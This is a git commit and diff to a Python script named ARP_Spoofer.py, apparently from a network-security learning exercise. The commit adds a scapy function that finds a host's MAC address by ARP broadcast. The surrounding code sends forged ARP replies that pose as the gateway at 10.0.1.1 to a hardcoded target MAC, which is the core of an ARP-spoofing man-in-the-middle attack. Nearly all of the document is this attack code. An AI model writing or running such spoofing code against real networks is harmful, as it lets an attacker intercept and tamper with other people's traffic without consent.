8c8735064ec0d8f176aed5a9e6ccea9302a1ddaa
Paul St. Amour <paul35444@aol.com>
2021-02-23 11:00:05 -0600

    - created get_mac function to get mac add from scanned ip

--- ARP_Spoofer.py
+++ ARP_Spoofer.py
@@ -2,6 +2,15 @@
 
 import scapy.all as scapy
 
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc 
+
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:01:af:01", psrc="10.0.1.1") #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
     scapy.send(packet)
+
